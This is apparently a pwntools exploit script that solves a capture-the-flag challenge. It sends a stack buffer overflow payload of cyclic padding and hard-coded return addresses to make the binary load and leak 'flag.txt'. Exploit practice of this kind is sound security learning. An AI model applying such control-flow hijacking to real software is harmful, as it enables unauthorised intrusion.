from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./pwn")
# io=remote("node2.anna.nssctf.cn",28565)

load_text=0x401493
leak=0x4014ee
ret=0x40101a

io.sendlineafter(b">> ",b"1")
io.sendlineafter(b"file_name : ",b".")

io.sendlineafter(b">> ",b"1")
io.sendlineafter(b"file_name : ",b"flag.txt")


io.sendlineafter(b">> ",b"2")
io.sendlineafter(b"file_content_length : ",b"1")
io.recvuntil(b"read more \n")

gdb.attach(io)
pause()

payload=cyclic(0x18)+p64(load_text)+p64(ret)*2+p64(leak)
io.send(payload)

io.sendlineafter(b"file_content_length : ",b"1")


io.interactive()